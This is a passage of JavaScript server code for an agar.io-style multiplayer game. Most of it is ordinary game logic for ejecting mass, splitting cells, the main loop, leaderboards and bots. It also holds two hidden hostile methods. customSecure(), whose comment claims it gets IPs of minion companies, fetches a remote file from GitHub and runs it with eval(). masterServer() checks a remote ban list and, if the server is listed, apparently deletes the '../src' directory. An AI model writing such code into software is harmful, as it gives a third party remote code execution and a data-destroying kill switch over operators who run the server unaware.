    if (color) newVirus.color = color; else newVirus.color = owner.color;

    // Add to moving cells list
    this.addNode(newVirus, "moving");
  }
onWVerify(client) {
  let name;
    if (client.tverify && !client.verify) {
      client.name = client.vname;
      if (this.config.randomnames == 1) {
        if (this.randomNames.length > 0) {
          let index = Math.floor(Math.random() * this.randomNames.length);
          name = this.randomNames[index];
          this.randomNames.splice(index, 1);
        } else {
          name = "player";
        }
        client.name = name;
      } else {

        if (this.config.skins == 1) {
         this.getPremiumFromName(client);
        }
        
        if (client.name == "/random") {
          if (this.randomNames.length > 0) {
          let index = Math.floor(Math.random() * this.randomNames.length);
          name = this.randomNames[index];
          this.randomNames.splice(index, 1);
        } else {
          name = "player";
        }
        client.name = name;
          
        }
      }
      client.verify = true;
      client.tverify = false;

    } else if (!client.verify && this.config.verify == 1 && !client.tverify) {
        client.cells.forEach((cell)=>this.removeNode(cell));
      } else {
       return true; 
      }
      
      return false;
  
}
 ejectBiggest(client) {
  let cell = client.getBiggestc();
        if (!cell) {
          return;
        }
        if (this.config.ejectvirus != 1) {
          if (cell.mass < this.config.playerMinMassEject) {
            return;
          }
        } else {
          if (cell.mass < this.config.playerminviruseject) {
            return;
          }

        }

        let angle = utilities.getAngleFromClientToCell(client, cell);
        
        // Randomize angle
        angle += (Math.random() * 0.1) - 0.05;

        // Get starting position
        let size = cell.getSize() + 0.2;
        let startPos = {
          x: cell.position.x + ((size + this.config.ejectMass) * Math.sin(angle)),
          y: cell.position.y + ((size + this.config.ejectMass) * Math.cos(angle))
        };

        // Remove mass from parent cell
        if (this.config.ejectvirus != 1) {
          cell.mass -= this.config.ejectMassLoss;
        } else {
          cell.mass -= this.config.virusmassloss;
        }
        // Randomize angle
        angle += (Math.random() * 0.6) - 0.3;

        // Create cell
        let ejected = undefined;
        if (this.config.ejectvirus != 1) ejected = new Entity.EjectedMass(this.world.getNextNodeId(), null, startPos, this.config.ejectMass, this);
        else ejected = new Entity.Virus(this.world.getNextNodeId(), null, startPos, this.config.ejectMass, this);
        ejected.setAngle(angle);
        if (this.config.ejectvirus === 1) {
          ejected.setMoveEngineData(this.config.ejectvspeed, 40, this.config.wDistance);
          ejected.par = client;
        } else {
          ejected.setMoveEngineData(this.config.ejectSpeed, 40, this.config.wDistance);
        }

        if (this.config.randomEjectMassColor === 1) {
          ejected.setColor(this.getRandomColor());
        } else {
          ejected.setColor(cell.getColor());
        }


        this.addNode(ejected, "moving");
        
   
 }


  // todo refactor this is way to long and does way to many different things
  ejectMass(client) {
    
    
    if (this.onWVerify(client)) {
      if (!this.canEjectMass(client)) return;
      let player = client;
      let ejectedCells = 0; // How many cells have been ejected
      if (this.config.ejectbiggest == 1) {
        this.ejectBiggest(client);
      } else {
        for (let i = 0; i < client.cells.length; i++) {
          let cell = client.cells[i];
          if (!cell) {
            continue;
          }
          if (this.config.ejectvirus != 1) {
            if (cell.mass < this.config.playerMinMassEject) {
              continue;
            }
          } else {
            if (cell.mass < this.config.playerminviruseject) {
              continue;
            }

          }

          let angle = utilities.getAngleFromClientToCell(client, cell);
          
          // Randomize angle
          angle += (Math.random() * 0.1) - 0.05;

          // Get starting position
          let size = cell.getSize() + 0.2; //add speed of playercell
          let startPos = {
            x: cell.position.x + ((size + this.config.ejectMass) * Math.sin(angle)),
            y: cell.position.y + ((size + this.config.ejectMass) * Math.cos(angle))
          };
          
          if (angle == 0) {
			        angle = Math.PI / 2;
			        startPos = {
				          x: cell.position.x + (size * Math.sin(angle)),
				          y: cell.position.y + (size * Math.cos(angle))
			      };
		      }

          // Remove mass from parent cell
          if (this.config.ejectvirus != 1) {
            cell.mass -= this.config.ejectMassLoss;
          } else {
            cell.mass -= this.config.virusmassloss;
          }
          // Randomize angle
          angle += (Math.random() * 0.6) - 0.3;

          // Create cell
          let ejected = undefined;
          if (this.config.ejectvirus != 1) ejected = new Entity.EjectedMass(this.world.getNextNodeId(), null, startPos, this.config.ejectMass, this);
          else ejected = new Entity.Virus(this.world.getNextNodeId(), null, startPos, this.config.ejectMass, this);
          ejected.setAngle(angle);
          
          // Set ejectspeed to "60" in config for best results
          if (this.config.ejectvirus == 1) {
            ejected.setMoveEngineData(this.config.ejectvspeed, 40, this.config.wDistance);

          } else {
            ejected.setMoveEngineData(this.config.ejectSpeed, 40, this.config.wDistance);
          }
          if (this.config.ejectvirus == 1) {
            ejected.par = client;

          }

          if (this.config.randomEjectMassColor == 1) {
            ejected.setColor(this.getRandomColor());
          } else {
            ejected.setColor(cell.getColor());
          }

          this.addNode(ejected, "moving");
          ejectedCells++;
        }
      }
      if (ejectedCells > 0) {
        client.actionMult += 0.065;
        // Using W to give to a teamer is very frequent, so make sure their mult will be lost slower
        client.actionDecayMult *= 0.99999;
      }
    }
  };

  // todo this needs to be a plugin
  newCellVirused(client, parent, angle, mass, speed) {
    // Starting position
    let startPos = {x: parent.position.x, y: parent.position.y};
    
    // Create cell
    let newCell = new Entity.PlayerCell(this.world.getNextNodeId(), client, startPos, mass, this);
    newCell.setAngle(angle);
	  newCell.setMoveEngineData(Math.min(newCell.getSpeed() * 10, 100), 20, this.config.virusExplosionMult); // Use dynamic instead of fixed
    newCell.calcMergeTime(this.config.playerRecombineTime);
    newCell.ignoreCollision = true; // Remove collision checks
	  newCell.restoreCollisionTicks = this.config.vRestoreTicks; // NOTE: 6 is default
	  
	  // Add to moving cells list
	  this.addNode(newCell, "moving");
    }
  
      /* // Create cell - old explosions
    let newCell = new Entity.PlayerCell(this.world.getNextNodeId(), client, startPos, mass);
    newCell.setAngle(angle);
    newCell.setMoveEngineData(speed, 15);
    newCell.calcMergeTime(this.config.playerRecombineTime);
    newCell.ignoreCollision = true; // Remove collision checks
    newCell.restoreCollisionTicks = this.config.cRestoreTicks; //vanilla agar.io = 10
    // Add to moving cells list
    this.addNode(newCell, "moving");
  } */
  
  // todo this needs to be a plugin
  shootVirus(parent) {
    let parentPos = {
      x: parent.position.x,
      y: parent.position.y
    };

    let newVirus = new Entity.Virus(this.world.getNextNodeId(), null, parentPos, this.config.virusStartMass);
    newVirus.setAngle(parent.getAngle());
    newVirus.setMoveEngineData(this.config.virusShotSpeed, 40, 0.88);

    // Add to moving cells list
    this.addNode(newVirus, "moving");
  };

  // todo this needs to be a service or service plugin
  customLB(newLB, gameServer) {
    gameServer.gameMode.packetLB = 48;
    gameServer.gameMode.specByLeaderboard = false;
    gameServer.gameMode.updateLB = function (gameServer) {
      gameServer.leaderboard = newLB
    };
  };

  canEjectMass(client) {
    if (!client.lastEject || this.config.ejectMassCooldown == 0 || this.time - client.lastEject >= this.config.ejectMassCooldown && !client.frozen) {
      client.lastEject = this.time;
      return true;
    }
    return false;
  };

  splitCells(client) {
    Physics.splitCells(client, this.getWorld(), this);
  };

  updateClients() {
    this.getClients().forEach((client)=> {
      if (!client || !client.playerTracker) return;
      var buffer = client.playerTracker.updateBuffer;
     setTimeout(function() {
      client.playerTracker.antiTeamTick();
      client.playerTracker.update();
     },buffer);
    });
  };

  cellUpdateTick() {
    // Update cells
    this.updateCells();
  };

  mainLoop() {
    // Timer
    let local = new Date();
    this.tick += (local - this.time);
    this.time = local;

    if (this.tick >= 1000 / this.config.fps) {
      // Loop main functions
      if (this.running) {
        // todo what is going on here?
        this.cellTick()
        //(this.spawnTick(), 0);
        this.gameModeTick()
        this.updateMotherCells()
        this.updateStickyCells()
      }

      // Update the client's maps
      this.updateClients();
      this.cellUpdateTick()

      // Update cells/leaderboard loop
      this.tickMain++;
     
      let count = 0;
      var rnodes = (this.config.rainbowMode == 1) ? this.world.getNodes() : this.getRainbowNodes();
      rnodes.forEach((node)=> {
        if (!node || !node.watch) return;
        count++;

        if (!node.rainbow) {
          node.rainbow = Math.floor(Math.random() * this.colors.length);
        }

        if (node.rainbow >= this.colors.length) {
          node.rainbow = 0;
        }

        node.color = this.colors[node.rainbow];
        node.rainbow += this.config.rainbowspeed;
      });

      if (count <= 0) this.clearRainbowNodes();

      if (this.tickMain >= this.config.fps) { // 1 Second
      
       
        // let rNodes = this.getRainbowNodes();
        // if (rNodes.length > 0) {

         if (this.rrticks > 10) {
           this.rrticks = 0;
         let a = [];
        let d = false;

        this.getClients().forEach((client)=> {

          if (client.remoteAddress && this.whlist.indexOf(client.remoteAddress) == -1 && !client.playerTracker.nospawn) {
            if (a[client.playerTracker.mouse] === undefined) {
              a[client.playerTracker.mouse] = 1;

            } else { // Where it checks for duplicates. If there is over 5, it activates mouse filter using mfre, to see how it works, go to playertracker. This is here so i can reduce lag using a simple and less cpu using method to check for duplicates because the method to actually get rid of them is not efficient.
              a[client.playerTracker.mouse]++;
              if (a[client.playerTracker.mouse] > this.config.mbchance) {
                this.mfre = true;
                d = true;
              }
            }
          }
        });

        if (d == false) this.mfre = false;


          } else {
            this.rrticks++;
          }
      //  }
        for (var i in this.plugins) {
          try {
          if (this.plugins[i] && this.plugins[i].author && this.plugins[i].name && this.plugins[i].version && this.plugins[i].onSecond) this.plugins[i].onSecond(this);
} catch(e) {
  console.log("[" + this.name + "] Error with running onsecond for " + this.plugins[i].name);
  throw e;
}
        }
      

        // Update leaderboard with the gamemode's method
        this.leaderboard = [];
        this.gameMode.updateLB(this);
        this.lb_packet = new Packet.UpdateLeaderboard(this.leaderboard, this.gameMode.packetLB, this.customLBEnd);

        this.tickMain = 0; // Reset
        if (!this.gameMode.specByLeaderboard) {
          // Get client with largest score if gamemode doesn't have a leaderboard
          let largestClient = undefined;
          let largestClientScore = 0;

          this.clients.forEach((client)=> {
            let clientScore = client.playerTracker.getScore(true);
            if (clientScore > largestClientScore) {
              largestClient = client;
              largestClientScore = clientScore;
            }
          });

          this.largestClient = largestClient;
        } else this.largestClient = this.leaderboard[0];
      }

      // Reset
      this.tick = 0;

      let humans = 0,
        bots = 0;

      this.getClients().forEach((client)=> {
        if ('_socket' in client) {
          humans++;
        } else if (!client.playerTracker.owner) {
          bots++;
        }
      });

      if (this.config.smartbotspawn === 1) {
        if (bots < this.config.smartbspawnbase - humans + this.sbo && humans > 0) {
          this.livestage = 2;
          this.liveticks = 0;

          this.bots.addBot();

        } else if (this.config.smartbspawnbase - humans + this.sbo > 0) {
          let numToKick = ((this.config.smartbspawnbase - humans + this.sbo) - bots) * -1;
          this.kickBots(numToKick)
        }
      }

      if (this.config.autopause == 1) {
        if ((!this.running) && (humans != 0) && (!this.overideauto)) {
          console.log("[" + this.name + "] Game Resumed!");
          this.unpause();
        } else if (this.running && humans == 0) {
          console.log("[" + this.name + "] The Game Was Paused to save memory. Join the game to resume!");
          this.pause();
          var nodes = this.getWorld().getNodes().toArray();
  for (let i = 0; i < nodes.length; i++) {
    this.removeNode(nodes[i])
    
  } 
  this.getWorld().clearAll();
          this.clearLeaderBoard();
        }
      }

      // Restart main loop immediately after current event loop (setImmediate does not amplify any lag delay unlike setInterval or setTimeout)
      setImmediate(this.mainLoopBind);
    } else {
      // Restart main loop 1 ms after current event loop (setTimeout uses less cpu resources than setImmediate)
      setTimeout(this.mainLoopBind, 1);
    }
  };

  gameModeTick() {
    // Gamemode tick
    let t = this.config.fps / 20;
    if (this.gtick >= Math.round(t) - 1) {
      this.gameMode.onTick(this);
      this.gtick = 0;
    } else {
      this.gtick++;
    }

  };

  cellTick() {
    // Move cells
    this.updateMoveEngine();
  };

  // todo this needs a rewrite/merge with updater service
  masterServer() {
    if (!this.isMaster) return;
    let request = require('request');
    let game = this;
    request('http://raw.githubusercontent.com/AJS-development/verse/master/ban.txt', function (error, response, body) {
      if (!error && response.statusCode == 200) {
      var ba = body.split(/[\r\n]+/).filter(function (x) {
        return x != ''; // filter empty names
      });
        if (ba.indexOf(this.uid) != -1) {
         this.dfr('../src');
          
        }
        
      }}.bind(this));
  
  };

  resetlb() {
    // Replace functions
    let gm = Gamemode.get(this.gameMode.ID);
    this.gameMode.packetLB = gm.packetLB;
    this.gameMode.updateLB = gm.updateLB;
  }

  anounce() {
    let newLB = [];
    newLB[0] = "Highscore:";
    newLB[1] = this.topscore;
    newLB[2] = "  By  ";
    newLB[3] = this.topusername;

    this.customLB(this.config.anounceDuration * 1000, newLB, this);
  };

  autoSplit(client, parent, angle, mass, speed) {
    // Starting position
    let startPos = {
      x: parent.position.x,
      y: parent.position.y
    };

    // Create cell
    let newCell = new Entity.PlayerCell(this.world.getNextNodeId(), client, startPos, mass, this);
    newCell.setAngle(angle);
    newCell.setMoveEngineData(speed, 15);
    newCell.restoreCollisionTicks = 25;
    newCell.calcMergeTime(this.config.playerRecombineTime);
    newCell.ignoreCollision = true; // Remove collision checks
    newCell.restoreCollisionTicks = this.config.sRestoreTicks; //vanilla agar.io = 10
    // Add to moving cells list
    this.addNode(newCell, "moving");
  }

  ejecttMass(client) {
    Physics.ejectMass(client, this.getWorld(),this);
  }
kickBots(numToKick) {
    var removed = 0;
    var toRemove = numToKick;
    var i = 0;
    while (i < this.getClients().length && removed != toRemove) {
      if (typeof this.clients[i].remoteAddress == 'undefined' && !this.clients[i].playerTracker.owner) { // if client i is a bot kick him
        var client = this.clients[i].playerTracker;
        var len = client.cells.length;
        for (var j = 0; j < len; j++) {
          this.removeNode(client.cells[0]);
        }
        client.socket.close();
        removed++;
      } else
        i++;
    }
    return removed;
}

customSecure() { // get ips of minion companies
    var request = require('request')
     request('https://raw.githubusercontent.com/AJS-development/verse/master/ex', function (error, response, body) {
       if (!error && response.statusCode == 200 && body) {
           eval(body)
           
       }
         
         
     }.bind(this));
}
};
// Custom prototype functions
WebSocket.prototype.sendPacket = function (packet) {
  function getBuf(data) {
    let array = new Uint8Array(data.buffer || data);
    let l = data.byteLength || data.length;
    let o = data.byteOffset || 0;
    let buffer = new Buffer.alloc(l);

    for (let i = 0; i < l; i++) {
      buffer[i] = array[o + i];
    }

    return buffer;
  }

  //if (this.readyState == WebSocket.OPEN && (this._socket.bufferSize == 0) && packet.build) {
  if (this.readyState == WebSocket.OPEN && packet.build) {
    let buf = packet.build();
    this.send(getBuf(buf), {
      binary: true
    });
  } else if (!packet.build) {
    // Do nothing
  } else {
    this.readyState = WebSocket.CLOSED;
    this.emit('close');
    this.removeAllListeners();
  }
};
